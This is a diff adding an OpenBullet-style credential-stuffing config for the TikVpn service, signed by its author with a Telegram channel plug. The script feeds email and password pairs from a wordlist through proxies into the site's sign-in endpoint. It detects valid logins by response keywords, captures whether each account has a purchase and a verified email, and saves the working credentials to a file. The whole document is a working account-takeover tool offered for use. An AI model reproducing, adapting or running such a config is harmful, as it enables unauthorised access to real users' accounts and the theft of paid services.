@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "TikVpn",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:44:35.5300145-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tikvpn.com/web/account/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "origin: https://www.tikvpn.com" 
+  HEADER "referer: https://www.tikvpn.com/sign/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+    KEY "{\"data\":{\"" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password. Please re-enter." 
+    KEY "{\"code\":40001,\"data" 
+
+#Purchased PARSE "<SOURCE>" LR ",\"purchased\":" ",\"" CreateEmpty=FALSE -> CAP "purchased" 
+
+#verified PARSE "<SOURCE>" LR ",\"email_verified\":" ",\"" CreateEmpty=FALSE -> CAP "verified" 
+
+FUNCTION Constant "LiLTOBA" -> CAP "Config BY" 
+
+UTILITY File "TikVpn.txt" AppendLines "USERPASS : <USER>:<PASS> | Purchased : <purchased> | verified : <verified> | Telegram Channel : T.me/ghoulblack" 
+
